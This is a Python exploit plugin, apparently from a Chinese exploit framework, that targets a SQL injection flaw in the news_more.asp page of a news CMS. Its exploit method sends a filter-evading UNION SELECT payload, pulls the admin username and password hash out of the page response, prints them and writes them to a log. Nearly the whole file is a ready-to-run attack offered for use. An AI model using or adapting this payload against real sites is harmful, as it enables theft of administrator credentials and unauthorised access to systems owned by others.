# -*- coding: utf-8 -*-
class mstplugin:
    infos = [
        ['Plugin','Ñ¶Ê± news_more.asp SqlInject Exp'],
        ['Author','ÄäÃû'],
        ['Update','2013/10/31'],
        ['site','http://www.google.com']
        ]
    opts  = [
        ['URL','localhost','Url'],
        ['PATH','/xsnews/','Cms path'],
        ['PORT','80','port']
        ]
    def exploit(self):
        url = fuck.urlformate(URL,PORT,PATH)
        exp = url+"news_more.asp?lm=2 %41nd 1=2 union %53elect 1,2,3,0x3b%26user,0x3b%26pass,6,7,8 %46rom %41dmin union %53elect * %46rom lm where 1=2"
        color.cprint("[*] Sending exp..",YELLOW)
        ok  = fuck.urlget(exp)
        if ok.getcode() == 200:
            tmp=fuck.find("2;.*?;.*?<",ok.read())
            if len(tmp)>0:
                color.cprint("[*] Exploit Successful !",GREEN)
                tmp2 = tmp[0][2:]
                user=tmp2[0:tmp2.find(';')]
                pass_md5=tmp2[tmp2.find(';')+1:-1]
                color.cprint('[*] '+user+'|'+pass_md5,GREEN)
                fuck.writelog("xuas_news_more.asp_sqli",URL+"::"+user+"::"+pass_md5)
            else:
                color.cprint("[!] TARGET NO VULNERABLE !",RED)
        else:
            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
